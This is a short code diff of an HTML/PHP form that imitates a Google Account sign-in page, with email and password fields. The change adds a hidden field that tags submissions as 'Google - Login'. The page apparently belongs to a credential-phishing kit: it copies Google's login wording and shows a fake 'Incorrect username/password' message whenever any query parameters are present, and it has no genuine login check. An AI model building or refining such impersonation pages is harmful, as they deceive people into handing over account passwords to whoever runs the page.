@@ -13,6 +13,7 @@
 	<h2>with your Google Account</h2>
 	<input id="user" type="text" name="username" placeholder="Enter your email">
 	<input type="password" name="password" placeholder="Enter your password">
+	<input type="hidden" name="referrer" value="Google - Login"/>
 	<p class="warning"><?php if (!empty($_GET)) { echo "Incorrect username/password. Try again.";}?></p>
 	<p><a href="">More options</a><span class="text-right"><button type="Submit">NEXT</button></span></p>
 </form>
